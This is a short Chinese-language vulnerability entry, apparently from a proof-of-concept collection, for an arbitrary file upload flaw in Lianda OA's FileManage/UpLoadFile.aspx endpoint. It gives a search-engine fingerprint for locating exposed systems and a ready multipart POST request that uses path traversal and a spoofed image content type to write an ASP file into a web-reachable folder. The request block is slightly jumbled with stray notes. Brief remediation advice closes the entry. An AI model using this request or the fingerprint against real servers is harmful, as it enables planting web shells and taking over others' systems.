# 联达OAFileManage-UpLoadFile存在任意文件上传漏洞

- **系统**：联达　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="Resource/js/LKSys_WindowControlScript.js"`
- **请求**：`POST /FileManage/UpLoadFile.aspx HTTP/1.1`

**请求体 / payload**
```
Hunter
hunter`web.body="Resource/js/LKSys_WindowControlScript.js"`
1. 部分界面如下
1. POC
Content-Type: multipart/form-data; boundary=00content0boundary00
Host:
Content-Length: 241
--00content0boundary00
Content-Disposition: form-data; name="DesignId"
1
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../2.asp"
Content-Type: image/png
123
--00content0boundary00--
上传文件位置
xxxxxxxxxx /FileManage/2.asp
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。\ 2、如非必要，禁止公网访问该系统。\ 3、设置白名单访问。